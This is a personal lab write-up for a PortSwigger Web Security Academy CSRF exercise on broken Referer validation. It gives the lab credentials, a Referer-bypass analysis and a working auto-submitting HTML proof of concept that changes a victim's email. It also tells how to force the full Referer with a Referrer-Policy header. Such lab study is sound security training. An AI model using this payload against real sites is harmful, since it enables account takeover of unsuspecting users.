---
tags:
  - PRACTITIONER
Link:
  - "[[CSRF]]"
External Link:
  - https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
---

# CSRF with broken Referer validation
---

- **Info:**
	- Vulnerable parameter - email change functionality
	- Goal - exploit the CSRF vulnerability to change the email address of the victim user
	- creds - `wiener:peter`

-  **Analysis:**
	- In order for CSRF attack to be possible:
		- A relevant action - ***email change functionality***
		- Cookie-based session handling - ***session cookie***
		- No unpredictable request parameters - satisfied

- **Bypass referer header:**
	1. Remove referer header
	2. Check which portion of the referer header is the application validating

- Craft Exploit that removes the referrer header of a request

```html
<html>
	<script>
		history.pushState('', '', '/?YOUR-LAB-ID.web-security-academy.net')
	</script>
	<body>
		<form method="POST"  action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@normal-user.net">
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

> [!NOTE] NOTE
> Although you may be able to identify this behavior using Burp, you will often find that this approach no longer works when you go to test your proof-of-concept in a browser. In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the `Referer` header by default.
> 
> You can override this behavior by making sure that the response containing your exploit has the `Referrer-Policy: unsafe-url` header set (note that `Referrer` is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string.
